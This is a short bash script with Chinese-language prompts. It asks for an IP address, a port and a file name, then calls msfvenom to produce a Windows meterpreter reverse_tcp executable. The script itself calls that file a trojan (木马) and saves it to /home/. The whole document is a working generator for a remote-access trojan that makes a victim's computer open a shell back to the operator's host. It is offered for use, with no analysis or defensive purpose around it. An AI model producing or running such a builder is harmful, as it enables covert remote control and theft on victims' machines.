read -p "请输入你的IP:" IP
read -p "请输入你的端口:" DK
read -p "请输入要生成的木马文件名(*.exe):" MM
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$DK -f exe > /home/$MM
echo "************木马$MM保存至/home/************"